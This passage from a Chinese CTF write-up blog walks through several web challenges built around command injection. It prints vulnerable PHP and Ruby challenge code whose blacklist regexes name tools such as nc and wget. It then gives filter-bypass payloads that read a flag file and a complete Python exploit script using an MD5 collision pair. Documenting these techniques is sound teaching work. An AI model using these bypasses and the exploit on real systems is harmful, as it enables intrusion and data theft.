<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        exec(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>看这主要的过滤对象，就是针对反弹shell的。</p>
<p>先试试能不能rce</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?url=sleep%205	<br></code></pre></td></tr></table></figure>
<p>能够看到果然出现了5s的延迟，那接下来选择外带，我这里用的curl，打的是自己的服务器，ceye.io有的时候感觉没有那么好用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir / | sed s/[[:space:]]/xx/g | tr &#x27;\n&#x27; &#x27;*&#x27;<br><span class="hljs-meta">#</span><span class="bash"> 把空格和tab替换成x，换行替换成</span><br>dir / | tr &#x27; &#x27; &#x27;x&#x27; |tr &#x27;\t&#x27; &#x27;x&#x27;|tr &#x27;\n&#x27; &#x27;,&#x27;<br></code></pre></td></tr></table></figure>
<p>这种方法的麻烦点就在于要构造合适的payload，也没有办法一梭子进去轻松rce，实际到那道题中构造payload也是要各种绕过（可以参考我之前那篇博客</p>
<p>补充：这题后来发现开了写权限，所以其实直接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?url=tac /flllll\aaaaaaggggggg | tee 1.txt<br></code></pre></td></tr></table></figure>
<h3 id="广东强网pokemenunicode过滤od命令">2、21广东强网——Pokemen（unicode过滤/od命令）</h3>
<p>先来看这道题的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DefenderBonus</span>(<span class="hljs-params"><span class="hljs-variable">$Pokemon</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="hljs-variable">$Pokemon</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Pokemon</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ghostpokemon</span>(<span class="hljs-params"><span class="hljs-variable">$Pokemon</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$Pokemon</span>))&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Pokemon</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$pks</span>) &#123;<br>            <span class="hljs-variable">$Pokemon</span>[<span class="hljs-variable">$key</span>] = DefenderBonus(<span class="hljs-variable">$pks</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$Pokemon</span> = DefenderBonus(<span class="hljs-variable">$Pokemon</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;myfavorite&#x27;</span>] ?? <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;picacu!&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;picacu!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;bulbasaur!&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;miaowa!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-variable">$level</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;levelup&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> ((!preg_match(<span class="hljs-string">&#x27;/lv100/i&#x27;</span>,<span class="hljs-variable">$level</span>)) &amp;&amp; (preg_match(<span class="hljs-string">&#x27;/lv100/i&#x27;</span>,escapeshellarg(<span class="hljs-variable">$level</span>))))&#123;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;./hint.php&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;squirtle&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;jienijieni!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;mewtwo&#x27;</span>:<br>        <span class="hljs-variable">$dream</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;dream&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$dream</span>)&gt;=<span class="hljs-number">20</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;So Big Pokenmon!&quot;</span>);<br>        &#125;<br>        ghostpokemon(<span class="hljs-variable">$dream</span>);<br>        <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$dream</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>首先一眼看去就是拿hint，也就是要创造字符串，使之被<code>escapeshellarg</code>处理之后存在<code>lv100</code>的字串。</p>
<p>这里我们可以利用unicode字符会被过滤的效果来实现，我们可以发现在<code>%80</code>之后的unicode字符会被该函数自动过滤掉，类似的处理在sql注入中也有（输入<code>%c2</code>这种utf-8中不存在的字符，也会被过滤）。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816223126427.png" srcset="/img/loading.gif" lazyload alt="image-20220816223126427" style="zoom:50%;" /></p>
<p>得到hint之后，显然就是构造一些巧妙的命令，直接去读取<code>/FLAG</code>文件。</p>
<p>首先要考虑读取文件，常见的读取方式显然不行，这里可以考虑使用<code>od</code>命令，空格的过滤利用<code>%09</code>代替，部分字符可以利用正则匹配实现，最后的命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">od%</span><span class="bash">09-c%09/F[B-Z][@-C]G</span><br></code></pre></td></tr></table></figure>
<p>成功读取到了flag。</p>
<h3 id="安询杯ez_web">3、安询杯——ez_web</h3>
<p>打开环境之后，观察url</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">1.14.71.254:28200</span>/index.php?img=TXpVek<span class="hljs-number">5</span>UTTFNbVUzTURabE<span class="hljs-number">5</span>qYz<span class="hljs-number">0</span>&amp;cmd=<br></code></pre></td></tr></table></figure>
<p>尝试解码img参数，发现这里有着文件包含的洞</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819203318445.png" srcset="/img/loading.gif" lazyload alt="image-20220819203318445" style="zoom:50%;" /></p>
<p>直接尝试php伪协议，发现无果，直接尝试index.php（猜测会将文件内容先用base64编码）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>果然拿到index.php的编码，原来是被正则过滤了。</p>
<p>md5的绕过非常简单，主要在于构造rce命令</p>
<p>首先使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir /	<br></code></pre></td></tr></table></figure>
<p>发现flag在根目录下，接下来就是读取文件，从网上学到可以使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sort /flag	<br></code></pre></td></tr></table></figure>
<p>不过这里介绍另外一个php的点，先给一个demo代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>	<br>	<span class="hljs-variable">$tar</span> = <span class="hljs-string">&quot;abc(\\&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar</span>.<span class="hljs-string">&quot;\n&lt;br&gt;\n&quot;</span>;<br>	<span class="hljs-variable">$tar1</span> = preg_replace(<span class="hljs-string">&quot;/\\|\\\\|\(|b|a|c/i&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tar</span>);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar1</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&lt;br&gt;\n&quot;</span>;<br>	<span class="hljs-variable">$tar1</span> = preg_replace(<span class="hljs-string">&quot;/\\\\/i&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tar</span>);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar1</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*********</span><br><span class="hljs-comment">before : &quot;abc\&quot;</span><br><span class="hljs-comment">replace: &quot;\&quot;</span><br><span class="hljs-comment">replace: &quot;\&quot;</span><br><span class="hljs-comment">***********/</span><br></code></pre></td></tr></table></figure>
<p>非常有意思的点在于，当正则中存在<code>\\</code>这样的语句时，会无效化后面的一个匹配项，当你要过滤<code>\</code>，你需要使用<code>\\\\</code>来实现，由此观察源代码，你会发现其实<code>\</code>并没有被过滤。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">c\at /flag<br></code></pre></td></tr></table></figure>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote,quote<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">toAsciiHex</span>(<span class="hljs-params">s</span>):</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://1.14.71.254:28200&quot;</span><br>    path = <span class="hljs-string">&quot;/index.php&quot;</span><br><br>    <span class="hljs-comment"># url = &quot;http://127.0.0.1&quot;</span><br>    <span class="hljs-comment"># path = &quot;/1.php&quot;</span><br><br>    filename = <span class="hljs-string">&quot;index.php&quot;</span><br>    cmd = <span class="hljs-string">&quot;c\\at /flag&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;img&quot;</span>:base64.b64encode(<br>                base64.b64encode(<br>                    toAsciiHex(filename).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))),<br>        <span class="hljs-string">&quot;cmd&quot;</span>:cmd,<br>    &#125;<br><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&quot;</span>)<br>    select = pattern.findall(cmd)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-literal">False</span>):<br>    <span class="hljs-comment">#if(select != []):</span><br>        <span class="hljs-built_in">print</span>(select)<br>    <span class="hljs-keyword">else</span>:<br>        proxies = &#123;<br>            <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>        &#125;<br><br>        <span class="hljs-comment"># md5</span><br>        a = <span class="hljs-string">r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1%ADn%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%96%B7%14%92%9B%88Oh%93%3E%EBb%3C%CB%9B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EUQ%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8%CCU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%05%3D%29%C1%5E&quot;</span><br>        b = <span class="hljs-string">r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1-n%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%16%B8%14%92%9B%88Oh%93%3E%EBb%3C%CB%1B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EU%D1%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8LU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%85%3D%29%C1%5E&quot;</span><br><br>        headers = &#123;<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>        &#125;<br><br>        data = <span class="hljs-string">&quot;a=&quot;</span>+a+<span class="hljs-string">&quot;&amp;b=&quot;</span>+b<br>        r = requests.post(url = url + path,params=params,proxies=proxies,headers=headers,data=data)<br><br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
<h3 id="第五空间png转换器ruby">4、第五空间—PNG转换器（Ruby）</h3>
<p>这道题考察的是Ruby的rce</p>
<p>对于Ruby内置的open函数，如果传入的参数开头为管道运算符，则可以实现rce。</p>
<p>首先查看源代码：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;digest&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;base64&#x27;</span><br><br>get <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/index.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&#x27;/upload&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/upload.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&#x27;/upload&#x27;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:file</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:tempfile</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;png&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">begin</span><br>    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>]) + <span class="hljs-string">&#x27;.png&#x27;</span><br>    open(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) &#123; <span class="hljs-params">|f|</span><br>      f.write open(params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:tempfile</span>],<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>    &#125;<br>    <span class="hljs-string">&quot;Upload success, file stored at <span class="hljs-subst">#&#123;filename&#125;</span>&quot;</span><br>  <span class="hljs-keyword">rescue</span><br>    <span class="hljs-string">&#x27;something wrong&#x27;</span><br>  <span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&#x27;/convert&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/convert.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&#x27;/convert&#x27;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">begin</span><br>    <span class="hljs-keyword">unless</span> params[<span class="hljs-string">&#x27;file&#x27;</span>]<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span><br>    <span class="hljs-keyword">end</span><br><br>    file = params[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">unless</span> file.index(<span class="hljs-string">&#x27;..&#x27;</span>) == <span class="hljs-literal">nil</span> &amp;&amp; file.index(<span class="hljs-string">&#x27;/&#x27;</span>) == <span class="hljs-literal">nil</span> &amp;&amp; file =~ <span class="hljs-regexp">/^(.+)\.png$/</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span><br>    <span class="hljs-keyword">end</span><br>    res = open(file, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>    headers <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span><br>    <span class="hljs-string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + 